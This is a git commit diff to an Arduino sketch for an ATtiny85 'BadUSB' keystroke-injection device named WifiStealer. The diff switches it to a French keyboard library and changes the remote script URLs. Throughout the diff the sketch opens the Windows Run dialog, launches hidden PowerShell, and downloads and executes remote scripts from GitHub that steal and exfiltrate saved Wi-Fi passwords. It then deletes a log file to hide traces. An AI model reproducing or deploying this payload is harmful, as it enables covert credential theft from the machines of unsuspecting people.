1cf1e7a75af9c8b00ce57958355cb40f560f4f37
nactrimo <77001801+nactrimo@users.noreply.github.com>
2024-05-28 15:54:24 +0200

    Update WifiStealer.ino

--- WifiStealer.ino
+++ WifiStealer.ino
@@ -1,9 +1,10 @@
-#include "DigiKeyboard.h"
+#include "DigiKeyboardFr.h"
+
 #define KEY_DOWN 0x51 // Keyboard Down Arrow
 #define KEY_ENTER 0x28 //Return/Enter Key
 
-#define stealScript "https://raw.githubusercontent.com/Rival420/ATtiny85-test/main/wifi-stealer"
-#define exfilScript "https://raw.githubusercontent.com/Rival420/ATtiny85-test/main/exfil-passwords"
+#define stealScript "https://raw.githubusercontent.com/nactrimo/ATtiny85-Hacks/main/wifi-stealer"
+#define exfilScript "https://raw.githubusercontent.com/nactrimo/ATtiny85-Hacks/main/exfil-passwords"
 #define token ""
 
 void setup() {
@@ -13,38 +14,36 @@ void setup() {
 }
 
 void my_delay(int number) {
-  DigiKeyboard.delay(number);
+  DigiKeyboardFr.delay(number);
 }
 
 void get_wifipasswords() {
   //WIN+R (run)
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   my_delay(200);
-  DigiKeyboard.println("powershell -windowstyle hidden IEX(wget " stealScript " | select content)");
+  DigiKeyboardFr.println("powershell -windowstyle hidden IEX(wget " stealScript " | select content)");
   my_delay(5000); // wait untill powershell script finishes
 }
 
 void exfil_wifipasswords() {
-  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboardFr.sendKeyStroke(0);
   my_delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   my_delay(200);
-  DigiKeyboard.println("powershell.exe");
+  DigiKeyboardFr.println("powershell.exe -w Hidden");
   my_delay(1000);
-  DigiKeyboard.println("$token=\"" token "\"");
-  my_delay(500);
-  DigiKeyboard.println("iex(wget " exfilScript " | select -ExpandProperty content)");
+  DigiKeyboardFr.println("iex(wget " exfilScript " | select -ExpandProperty content)");
   my_delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
   my_delay(1000);
-  DigiKeyboard.println("rm Log.txt");
-  DigiKeyboard.println("exit");
+  DigiKeyboardFr.println("rm Log.txt");
+  DigiKeyboardFr.println("exit");
 }
 
 void loop() {
   // put your main code here, to run repeatedly:
-  DigiKeyboard.update();
-  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboardFr.update();
+  DigiKeyboardFr.sendKeyStroke(0);
   my_delay(3000);
   get_wifipasswords();
   exfil_wifipasswords();
